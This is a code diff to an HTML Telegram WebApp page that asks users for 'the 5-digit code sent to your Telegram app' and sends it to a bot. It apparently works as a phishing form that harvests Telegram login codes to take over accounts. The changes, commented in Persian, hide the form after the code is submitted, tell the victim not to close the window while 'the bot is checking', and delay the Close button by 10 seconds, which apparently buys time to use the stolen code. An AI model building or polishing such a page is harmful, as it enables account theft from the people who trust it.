@@ -41,6 +41,7 @@
         .icon { font-size: 60px; margin-bottom: 10px; display: block; }
         h1 { font-size: 24px; margin-bottom: 8px; }
         .subtitle { font-size: 14px; opacity: 0.85; }
+
         label { display: block; font-size: 14px; margin-bottom: 8px; color: #fff; }
         input {
             width: 100%;
@@ -55,6 +56,7 @@
         }
         input::placeholder { color: rgba(255, 255, 255, 0.5); }
         input:focus { border-color: #2481cc; }
+        
         button {
             width: 100%;
             padding: 16px;
@@ -68,11 +70,12 @@
             cursor: pointer;
         }
         button:disabled { opacity: 0.5; }
-        .status { text-align: center; margin-top: 15px; font-size: 13px; color: #fff; }
+
+        .status { text-align: center; margin-top: 15px; font-size: 14px; color: #fff; line-height: 1.6; }
         .loading {
             display: inline-block;
-            width: 16px;
-            height: 16px;
+            width: 18px;
+            height: 18px;
             border: 2px solid rgba(255,255,255,0.3);
             border-top-color: #fff;
             border-radius: 50%;
@@ -81,6 +84,35 @@
             margin-left: 8px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+        
+        /* باکس پیام موفقیت/خطا */
+        .message-box {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 14px;
+            line-height: 1.6;
+            text-align: center;
+            color: #fff;
+        }
+        .message-box.success { display: block; background: rgba(74, 222, 128, 0.2); border-right: 4px solid #4ade80; }
+        .message-box.error { display: block; background: rgba(248, 113, 113, 0.2); border-right: 4px solid #f87171; }
+
+        .close-btn {
+            display: none;
+            width: 100%;
+            padding: 16px;
+            background: #4ade80;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            margin-top: 15px;
+            cursor: pointer;
+        }
+        .close-btn.show { display: block; }
     </style>
 </head>
 <body>
@@ -90,10 +122,19 @@
             <h1>Verification Code</h1>
             <p class="subtitle">Enter the 5-digit code sent to your Telegram app</p>
         </div>
-        <label>Code:</label>
-        <input type="tel" id="code" placeholder="12345" maxlength="6" inputmode="numeric" dir="ltr">
-        <button onclick="sendCode()" id="btnCode">Verify Code</button>
-        <p class="status" id="status"></p>
+        
+        <div id="formSection">
+            <label>Code:</label>
+            <input type="tel" id="code" placeholder="12345" maxlength="6" inputmode="numeric" dir="ltr">
+            <button onclick="sendCode()" id="btnCode">Verify Code</button>
+            <p class="status" id="status"></p>
+        </div>
+
+        <!-- باکس پیام که بعد از تایید نمایش داده میشود -->
+        <div id="messageBox" class="message-box"></div>
+        
+        <!-- دکمه بستن که فقط بعد از پیام نمایش داده میشود -->
+        <button class="close-btn" id="btnClose" onclick="tg.close()">Close</button>
     </div>
 
     <script>
@@ -105,6 +146,8 @@
             const code = document.getElementById('code').value.replace(/\D/g, '');
             const status = document.getElementById('status');
             const btn = document.getElementById('btnCode');
+            const messageBox = document.getElementById('messageBox');
+            const formSection = document.getElementById('formSection');
 
             if (!code || code.length < 4) {
                 tg.showAlert('Enter code');
@@ -112,17 +155,23 @@
             }
 
             btn.disabled = true;
-            status.innerHTML = '<span class="loading"></span> Verifying...';
+            status.innerHTML = '<span class="loading"></span> Verifying with Telegram...';
 
             try {
+                // ارسال کد به ربات
                 tg.sendData(JSON.stringify({ action: 'send_code', code: code }));
-                status.innerHTML = '✅ Checking... (If wrong, you will get an error in chat)';
-                status.style.color = '#4ade80';
                 
-                // بستن وب‌اپ بعد از 2 ثانیه
+                // مخفی کردن فرم و نمایش پیام انتظار
+                formSection.style.display = 'none';
+                messageBox.className = 'message-box success';
+                messageBox.innerHTML = '⏳ <b>Code sent to bot!</b><br><br>Please wait. The bot is checking your code.<br>Do NOT close this window yet.';
+                
+                // نمایش دکمه بستن بعد از 10 ثانیه
                 setTimeout(() => {
-                    tg.close();
-                }, 2000);
+                    messageBox.innerHTML = '⏳ <b>Still checking...</b><br><br>If your code was correct, you will get a success message in the bot chat.<br>You can now close this window.';
+                    document.getElementById('btnClose').classList.add('show');
+                }, 10000);
+
             } catch(e) {
                 status.innerHTML = '❌ ' + e.message;
                 btn.disabled = false;
